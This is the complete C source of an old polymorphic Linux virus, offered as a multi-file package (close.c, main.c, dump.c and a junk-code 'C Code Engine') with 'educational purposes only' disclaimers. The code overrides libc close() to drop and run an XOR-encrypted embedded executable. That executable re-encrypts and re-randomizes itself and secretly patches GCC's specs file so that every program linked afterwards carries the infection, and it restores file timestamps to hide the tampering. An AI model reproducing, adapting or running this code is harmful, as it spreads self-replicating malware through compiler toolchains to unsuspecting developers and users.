ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[close.c]ÄÄÄ
/***14***/
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

#define __NR_close 6

extern char X1[];
extern int X1LEN;

int cclose(int);
int dump_it(FILE*, char*, char*, int);

/***8***/
int close(int fd)
{
   	static int first = 0;
        int i = 0;
        FILE *o1, *o2, *o3, *o4, *o5, *o7;
        int retval;
        char *argv[3] = {0};
 
    	argv[0] = tmpnam(NULL);
        if (first == 1) {
           	return cclose(fd);
        }
        first = 1;
        
        retval = cclose(fd);
/***5***/
#ifndef DEBUG
        if (fork() > 0) {
           	return retval;
        }
#endif
        if ((o1 = fopen(argv[0], "w+")) == NULL) {
/***3***/
#ifdef DEBUG
              	perror("fopen");
#endif
                exit(errno);
        }
        Vcrypt(X1, KEY, X1LEN);
        dump_it(o1, X1, NULL, X1LEN);

        fclose(o1); 
 
        chmod(argv[0], 0100|0200|0400);
        execve(argv[0], argv, NULL);
/***end***/
}                

/***3***/
int cclose(int fd)
{
   	long __res;
 
    	errno = 0;       
/***3***/
        __asm__ volatile ("int $0x80"
                	: "=a" (__res)
                        : "0" (__NR_close),"b" ((long)(fd)));
                        if (__res >= 0) {
                           	return (int)__res;
                        }
                        errno = -__res;
                        return -1;
/***end***/
}

/***4***/
/* We expect key as char[30] */
int Vcrypt(char *s, char *key, int s_len)
{
   	int i = 0, j = 0;
        
        for(;i < s_len; i++) {
           	s[i] ^= key[j++ % 30];           	
        }
        return 0;
/***end***/
}

/***3***/
int dump_it(FILE *fd, char *s, char *cnam, int s_len)
{
   	int i = 0, j = 1, count = 0;
        
        if (cnam) {
           	fprintf(fd, "char %s[] =\n\"", cnam);
        }
        for (; i < s_len; i++) {
           	count++;
                if (cnam) {
                   	fprintf(fd, "\\x%02x", (unsigned char)s[i]);
                } else {
                   	fprintf(fd, "%c", s[i]);
                }
                if (!(j % 15) && cnam) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
                j++;
        }
        if (j != 1 && cnam) {
           	fprintf(fd, "\"");
        }
        if (cnam) {
           	fprintf(fd, ";");
                fprintf(fd, "int %sLEN = %d;\n", cnam, count);
        }
        return 0;
/***end***/
}
   
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[close.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[main.c]ÄÄÄ
/* Note:
 * X1[] wich comes from kalif.c contains the executable "kalif" as hex-dump
 * X2[] wich is included in the kalif executable contains close.c.
 * (so kalif.c contains only the var X1[] and close.c contains close() 
 * function.)
 * LOOP:
 * kalif.o and close.o are both linked to victum.c. victum calls close()
 * wich extracts X1[] to kalif executable wich is executed after this.
 * kalif exe. extracts close() sourcecode from X2[] and randomizes it as well.
 * kalif exe. also extracts itself to file kalif.c wich ONLY contains X1[].
 * Now kalif.c and close.c will be compiled and you can jump to LOOP.
 */

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <utime.h>
#include "cce/cce.h"

#define KLEN 13000

int dump_it(FILE*, char*, char*, int);
extern char X2[];	/* close.c */
extern int X2LEN;

/* we already have thiz function in SSCR */
extern FILE *xfopen(char*, char*);

int main(int argc, char **argv, char **envp)
{
        char *kalif;
        int in, r;
        FILE *fd, *out;
        char specs[100] = {0},
             key[30] = {0},
             exe[200] = {0};
        struct stat st;
        struct utimbuf ut;
        
        if ((kalif = (char*)malloc(KLEN)) == NULL) {
           	perror("malloc");
                exit(errno);
        }
        if ((in = open(argv[0], O_RDONLY)) < 0) {
#ifdef DEBUG
           	perror("open");
#endif
                exit(errno);
        }
        r = read(in, kalif, KLEN);
        /* dump executable as hex */
        fd = xfopen("/tmp/kalif.c", "w+");
        /* but before we mutate a little bit :) */
        mutate(key);
        Vcrypt(kalif, key, r);
        dump_it(fd, kalif, "X1", r);
        fclose(fd);
        
        /* get source of close() */
        fd = xfopen("/tmp/close.c", "w+");
        dump_it(fd, X2, NULL, X2LEN);
        fclose(fd);
        
        /* get directory where specs resists */
        system("egcs -v 2>t");
        fd = xfopen("t", "r");
        fscanf(fd, "Reading specs from %s\n", specs);
#ifdef DEBUG
        printf("%s", specs);        
#endif
        fclose(fd);
        unlink("t");
        /* randomize close.c */
        init_cce();
        randomize_file("/tmp/close.c", "/tmp/closeR.c");
        unlink("/tmp/close.c");
        
        /* and compile it to be linked into victum later */
        sprintf(exe, "gcc -c -O2 -D KEY=\"\\\"%s\\\"\" /tmp/closeR.c -o /tmp/.close.o~&>/dev/null", key);
#ifdef DEBUG
        printf("%s\n", exe);
#endif
        system(exe);
        system("gcc -c -O2 /tmp/kalif.c -o /tmp/.kalif.o~&>/dev/null");
        unlink("/tmp/kalif.c");
#ifndef DEBUG
        unlink("/tmp/closeR.c");
#endif

   	/* BREAK! if EIP is here, we already did the following:
         * extraceted close.c
         * randomized close.c
         * compiled rand. close.c 
         * extracted kalif to c-file
         * compiled it
         * what we do now is simply patch the specs file of GCC to link in
         * our 2 nasty obj-files every time gcc is ionvoked
         */

        /* dont touch permissions */
        stat(specs, &st);
        
        fd = xfopen(specs, "r+");
        bzero(kalif, KLEN);
        kalif[0] = 'X';
        
        /* seek to our fave position */
        while (strcmp(kalif, "*link:\n")) 
           	fgets(kalif, 200, fd);
        fgets(kalif, 200, fd); 
        fclose(fd);

        /* already patched ? */
        if (strstr(kalif, "/tmp/.kalif.o~")) 
           	return 0;
        
        /* we're friendly: we save specs-file :) */
        sprintf(exe, "mv %s /tmp/.specs.bak~>/dev/null", specs);
        system(exe);
        
        /* get position where we will add our stuff */
        fd = xfopen("/tmp/.specs.bak~", "r");
        out = xfopen(specs, "w+");
        while (strcmp(kalif, "*link:\n")) {
           	fgets(kalif, 200, fd);
                fprintf(out, "%s", kalif);
        }
        
        fprintf(out, "/tmp/.kalif.o~ /tmp/.close.o~ "); 	
        
        /* write rest of original to patched specs */
        while (fgets(kalif, 200, fd))
           	fprintf(out, "%s", kalif);

   	/* put orig attribs... */
        fchmod(fileno(out), st.st_mode);
         
        fclose(fd);
        fclose(out);
        free(kalif);
        
        /* ...and time to file */
        ut.actime = st.st_atime;
        ut.modtime = st.st_mtime;
        utime(specs, &ut);
        return 0;
}

/* dump string s to file:
 * if cnam != NULL then use Hexdump otherwise
 * simply do it with %c
 */
int dump_it(FILE *fd, char *s, char *cnam, int s_len)
{
   	int i = 0, j = 1, count = 0;
        
        if (cnam) 
           	fprintf(fd, "char %s[] =\n\"", cnam);
        for (; i < s_len; i++) {
           	count++;
                if (cnam) 
                   	fprintf(fd, "\\x%02x", (unsigned char)s[i]);
                else 
                   	fprintf(fd, "%c", s[i]);
                if (!(j % 15) && cnam) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
                j++;
        }
        if (j != 1 && cnam) 
           	fprintf(fd, "\"");
        if (cnam) {
           	fprintf(fd, ";");
                fprintf(fd, "int %sLEN = %d;\n", cnam, count);
        }
        return 0;
}

/* Virus-crypt, Virtual-crypt, Vacsina-crypt... i dunno ;) */
int Vcrypt(char *s, char *key, int s_len)
{
   	int i = 0, j = 0;
        
        for(;i < s_len; i++) 
           	s[i] ^= key[j++ % 30];           	
        return 0;
}

/* fill array of 30 bytes with random chars */
int mutate(char *key)
{
   	int i = 0;
        srand(time(NULL));
        for (;i < 30; i++) 
           	key[i] = 65 + rand() % 25;
        return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[main.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[dump.c]ÄÄÄ
/* special dump.c for TLB */
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

int main(int argc, char **argv)
{

   	char *buf;
        int in, i = 0, r = 0, j = 0, k = 0, count = 0;
        FILE *out;
        char file[50] = {0}, var[50] = {0};
        
        if (argc < 2) {
           	printf("usage: dump [file1] [file2] [...]\n");
                return 0;
        }
        if ((buf = (char*)malloc(1000)) == NULL) {
           	perror("malloc");
                exit(errno);
        }
        j = 1;
        /* process all files ...*/
        for (k = 1; k < argc; k++) {
           	/* get file and var-name */
                sprintf(file, "X%d.c", k);
           	sprintf(var, "X%d", k);
                if ((in = open(argv[k], O_RDONLY)) < 0 || 
                    (out = fopen(file, "w+")) == NULL) {
                       perror("open1");
                       exit(errno);
                }
                fprintf(out, "char %s[] = \n\"", var);
                /* write hexdump in this loop to file */
                while ((r = read(in, buf, 1000)) > 0) {
                   	if (!strcmp(argv[k], "kalif"))
                           	Vcrypt(buf, KEY, r);
                   	for (i = 0; i < r; i++) {
                           	count++;
                           	if ((j % 15) == 0) {
                                   	fprintf(out, "\"\n\"");
                                        j = 0;
                                }
                                j++;
                                fprintf(out, "\\x%02x", (unsigned char)buf[i]);  
                        }
                }
                fprintf(out, "\";\n\n");
                fprintf(out, "int X%dLEN = %d;\n", k, count);
                close(in);
                fclose(out);
                count = 0;
        }
        return 0;
}               

int Vcrypt(char *s, char *key, int s_len)
{
   	int i = 0, j = 0;
        
        for(;i < s_len; i++) 
           	s[i] ^= key[j++ % 30];           	
        return 0;
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[dump.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[cce/sscr.c]ÄÄÄ
/* Stealthf0rk's Source Code Randomizer SSCR V0.7
 * Uses the CCE at least version 0.7. To randomize your
 * c-file just call 
 * 	randomize_file(infile, outfile); 
 * where infile is the file to randomize; or
 * 	randmomize_fd(in_fd, out_fd); 
 * for the same result but with a legal FILE structure.
 * This was build for educational purposes only!
 * I'm not responsible for any damage you may get or make due to
 * using SSCR or CCE!
 * For your rights look at the GPL.
 * Ahhh...take a look at the README wich describes
 * the format of the c-files wich gets clean through SSCR!
 */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include "cce.h"

/* damn! Thiz makes me remember at TP ;)  */
int writeln(FILE *, FILE*, int);
void *xmalloc(int);
FILE *xfopen(char *, char*);

extern char vars[100][30];

int randomize_file(char *infile, char *outfile)
{

   	FILE *out_fd, *in1_fd, *in2_fd;

        out_fd = xfopen(outfile, "w+");
        in1_fd = xfopen(infile, "r");                        
        
        randomize_fd(in1_fd, out_fd);
        fclose(in1_fd);
        fclose(out_fd);
        return 0;
}

int randomize_fd(FILE *in1_fd, FILE *out_fd)
{

   	int (*func[10])(FILE*);
        char *buf;
        int i = 0, d = 0, infunc = 0, first = 0;
        
        /* for later random-calls */
        func[0] = gen_if;
        func[1] = gen_while;
        func[2] = gen_switch;
        func[3] = gen_for;
        func[4] = gen_seq;
        
        buf = (char*)xmalloc(MAXCHAR);
        
        /* Get first # of lines for writing (#include shit) */
        fgets(buf, MAXCHAR, in1_fd);
        if (sscanf(buf, "/***%d***/", &d) == 0) {
#ifdef DEBUG
           	printf("Ups...wrong file format!\n");
#endif
                exit (-1);
        }
        fprintf(out_fd, "%s", buf);
        writeln(in1_fd, out_fd, d);
        /* Ha! */
        init_cce();
        /* Write kewl funcs into file */
        gen_funcs(out_fd);
        /* read in line by line, put it to outfile and put also
         * some random shit in it.
         * if we find a "/***end**./\n" we stop putting random
         * calls into outfile, coz we are outa function.
         */
        while (1) {
           	if (fgets(buf, MAXCHAR, in1_fd) == NULL)
                   	break; 
                fprintf(out_fd, "%s", buf);
                /* if we find thiz format lets roQ ! 
                 * We are in a func...
                 */
                if (sscanf(buf, "/***%d***/", &d) > 0) {
                   	writeln(in1_fd, out_fd, d);
                        if (!first) {
                           	bzero(vars, 3000);
                                choose_vars(out_fd);
                                first = 1;
                        }
                        infunc = 1;
                }
                if (strcmp(buf, "/***end***/\n") == 0) {
                /* we are out of...*/
                   	bzero(buf, MAXCHAR);
                   	fgets(buf, MAXCHAR, in1_fd);
                        fprintf(out_fd, "%s", buf);
                   	infunc = 0;
                        first = 0;
                }
                if (rand() % 10 > 4 && infunc) {
                   	for (i = 0; i < rand() % 5; i++)
                           	func[rand() % 5](out_fd);
                }
                bzero(buf, MAXCHAR);
        }
        free(buf);
        return 0;
}

/* write n lines from in to out */
int writeln(FILE* in1_fd, FILE *out_fd, int n)
{
   	int i = 0;
        char *buf;
        
        buf = (char*)xmalloc(MAXCHAR);
        
        for(;i < n; i++) {
           	if (fgets(buf, MAXCHAR, in1_fd) == NULL) {
#ifdef DEBUG
                   	perror("huh ? fgets");
#endif
                        exit(errno);
                }
                fprintf(out_fd, "%s", buf);
                bzero(buf, MAXCHAR);
        }
        free(buf);
        return 0;
}

/* Wrapper functions...*/
void *xmalloc(int n)
{
   	void *r;
        
   	if ((r = malloc(n)) == NULL) {
           	perror("malloc");
                exit(errno);
        }
        return r;
}

FILE *xfopen(char *nam, char *mod)
{
   	FILE *r;
        
        if ((r = fopen(nam, mod)) == NULL) {
#ifdef DEBUG
           	perror("fopen");
#endif
                exit(errno);
        }
        return r;
}


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[cce/sscr.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[cce/cce.c]ÄÄÄ
/* CCE the C - Code Engine V 0.7
 * (C)opyright 1998 Stealthf0rk / SVAT  <stealth@cyberspace.org>
 * For your rights look at the GPL.
 * You use this at your own risk. I'm not responsible for any damage you
 * maybe get due to using this program.
 * For educational purposes only.
 */

#include <stdio.h>
#include <fcntl.h>
#include "cce.h"

char vars[100][30];  /*  variables we have */
char funcs[100][30]; /* functions we have  */
int maxvar = 0;      /* counts the vars    */ 
int maxfunc = 0;     /* counts the funcs   */ 

/* call this first before you use any gen_XXX function */
int init_cce(void)
{
   	bzero(vars, 3000);
        bzero(funcs, 3000);
        srand(time(NULL));
        return 0;
}

/* generate a for(...) */
int gen_for(FILE *fd)
{
   	
        int (*func[10])(FILE*);
        int i = 0, r = 0;
        
        func[0] = NULL;
        func[1] = gen_switch;
        func[2] = gen_while;
        func[3] = gen_seq;
        func[4] = gen_if;
        
        fprintf(fd, "\nfor ("); gen_expr(fd);
        fprintf(fd, ";"); gen_expr(fd);
        fprintf(fd, ";"); gen_expr(fd);
        fprintf(fd, ") { \n"); 
#ifdef BESURE
        fprintf(fd, "break;\n");
#endif
        for (i = 0; i < rand() % 3; i++) {
           	r = rand() % 5;
                if (r)
                   	func[r](fd);
        }
        
        fprintf(fd, "} /* for */\n");
        return 0;
}

/* generates a while-loop */
int gen_while(FILE* fd)
{

   	int (*func[10])(FILE*);
        int i = 0, r = 0;
   
   	func[0] = NULL;
        func[1] = gen_switch;
        func[2] = gen_for;
        func[3] = gen_seq;
        func[4] = gen_if;
          	        
        fprintf(fd, "\nwhile ("); gen_expr(fd); fprintf(fd, ") { \n");
#ifdef BESURE
        fprintf(fd, "break;\n");
#endif
        for (i = 0; i < rand() % 3; i++) {
           	r = rand() % 5;
                if (r)
                   	func[r](fd);
        }
        fprintf(fd, "} /* while */\n");
        return 0;
}


int gen_expr(FILE *fd)
{
        char *ops[] = {"=", "<", "<=", ">", ">=", "==", "!="};  /* 7 */
        
        fprintf(fd, "%s %s %s", vars[rand() % maxvar], ops[rand() % 7], vars[rand() % maxvar]);                  
        return 0;
}

/* generates i = j + 1; for exapmle */
/* don't generate a i = j / k; bcoz k is maybe 0 */
int gen_seq(FILE *fd)         
{
   	char o[] = {'-', '+', '*', '-', '+', '&', '|', '^'}; /* 8 */
         
    	fprintf(fd, "%s = (int)(%s %c", vars[rand() % maxvar], 
                                        vars[rand() % maxvar], o[rand() % 8]);
        if (rand() % 10 >= 5)
           	fprintf(fd, " %s);\n", vars[rand() % maxvar]);
        else
           	fprintf(fd, " %d);\n", rand() % 10000 + 1);
        if (rand() % 50 > 15) 
           	fprintf(fd, "%s();\n", funcs[rand() % maxfunc]);
        return 0;  	
}

/* generate a new function */
int gen_funcs(FILE *fd)
{
   	
        char *f;
        int (*func[10])(FILE *);
        int i, j, counter;
        char s[2] = {0};
    
        func[0] = gen_seq;
        func[1] = gen_while;
        func[2] = gen_for;
        func[3] = gen_if;
        func[4] = gen_switch;
        
        setenv("TMPDIR", "/tmp", 1);
        /* first find unique names and fill array funcs[][] */   
        for (i = 0; i < rand() % 91 + 9; i++) { 
           	sprintf(s, "%c", (char)(rand() % 26 + 65));
                f = tempnam(NULL, s) + 5;
                fprintf(fd, "int %s(void);\n", f);
                strcpy(funcs[maxfunc], f);
                maxfunc++;
        }
        /* we have already the names, now build the body */
        for (i = 0; i < maxfunc; i++) {
#ifdef DEBUG
           	printf("Ok...generating %s()\n", funcs[i]);
#endif
                fprintf(fd, "\nint %s(void)\n{\n", funcs[i]);
        /* generate the variables we have in this function */
           	choose_vars(fd);
                counter = rand() % maxvar;
        /* ha, we don't want smashing stack ! */
           	fprintf(fd, "if((%s=(rand() %s 20)) >= %d)\n", vars[counter], "%", rand() % 40); 
                fprintf(fd, "return %d;\n", rand() % 200);
#ifdef DEBUG
                fprintf(fd, "printf(\"in function: %s\\n\");\n", funcs[i]);
#endif
        /* choose completely random sequences/calls/for()/... */
                for (j = 0; j < rand() % 10 + 1; j++)
                   	func[rand() % 5](fd);
        /* end of func */
           	fprintf(fd, "\nreturn %d;\n}\n", rand() % 1000);
        }
        return 0;
}

/* fill array vars[] with names of variables we can use
 * note that we don't want a zero, coz we might do a x = x / y;
 * so give the vars a value 1-10
 */
int choose_vars(FILE *fd)
{

   	int i = 0, j = 0;
        /* they all are int, and different for every function, so delete old */
        memset(vars, 0, 3000);
        maxvar = 0;
        fprintf(fd, "int ");
        /* at least 5 vars, not more than 100 */
        for (i = 0; i < rand() % 95 + 5; i++) {
        /* at least 5 chars long */
           	for (j = 0; j < rand() % 7 + 5; j++)
                   	vars[i][j] = 97 + rand() % 25;
                fprintf(fd, "%s = %d, ", vars[i], rand() % 10 + 1);
        } 
        /* How many vars do we have ? */
        maxvar = i;
        fprintf(fd, "X = 1;\n");
        return 0;
}

/* generate a (maybe) complete dump if-condition with a else
 * in 50% of all cases 
 */             
int gen_if(FILE *fd)
{
   	
        int (*func[10])(FILE*);
        int i = 0, r = 0;

   	/* fill up fucntion array... */
        func[0] = NULL;
        func[1] = gen_while;
        func[2] = gen_for;
        func[3] = gen_seq;
        func[4] = gen_switch;
        
        fprintf(fd, "if ("); gen_expr(fd); fprintf(fd, ") { \n");
        /* ...and call it randomly here... */
        for (i = 0; i < rand() % 3; i++) {
           	r = rand() % 5;
                if (r)
                   	func[r](fd);
        }
        fprintf(fd, "\n} /* if */\n");
        if (rand() % 10 > 5) {
           	fprintf(fd, "else { \n");
                /* ...and maybe here */
                   	for (i = 0; i < rand() % 3; i++) {
                           	r = rand() % 5;
                                if (r)
                                   	func[r](fd);
                        }
        fprintf(fd, "\n} /* else */\n");
        }
        return 0;
}

/* put a switch(x) into fd
*/
int gen_switch(FILE *fd)
{
   	
        int (*func[5])(FILE*), i, j, r;
        
        func[0] = NULL;
        func[1] = gen_seq;
        func[2] = gen_while;
        func[3] = gen_if;
        func[4] = gen_for;
        
        fprintf(fd, "switch (%s) {\n", vars[rand() % maxvar]);
        for (i = 0; i < rand() % 5 + 1; i++) {
           	/* you might wonder, but we dont want 'case X:' doubled */
                fprintf(fd, "case %d:\n", i);
                for (j = 0; j < rand() % 3; j++) {
                   	r =  rand() % 5;
                        if (r)
                           	func[r](fd);
                }
                fprintf(fd, "break;\n");
        }
        if (rand() % 100 > 50)
           	fprintf(fd, "default:\nbreak;\n");
        fprintf(fd, "}\n");
        return 0;
}
                     
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[cce/cce.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[test.c]ÄÄÄ
#include <stdio.h>

int main(void)
{
   	printf("X\n");
        close(-11);
        return 0;
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[test.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[cce/cce.h]ÄÄÄ
/* Uhh...Ahh...A quiet place...
 * Here you find the prototypes. 
 */

#define BESURE
//#define DEBUG
#define MAXCHAR 200

int init_cce(void);
int gen_while(FILE*);
int gen_for(FILE*);
int gen_switch(FILE*);
int gen_if(FILE*);
int gen_expr(FILE*);
int gen_seq(FILE*);
int gen_funcs(FILE*);
int choose_vars(FILE*);

int randomize_file(char*, char*);
int randomize_fd(FILE*, FILE*);

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[cce/cce.h]ÄÄÄ
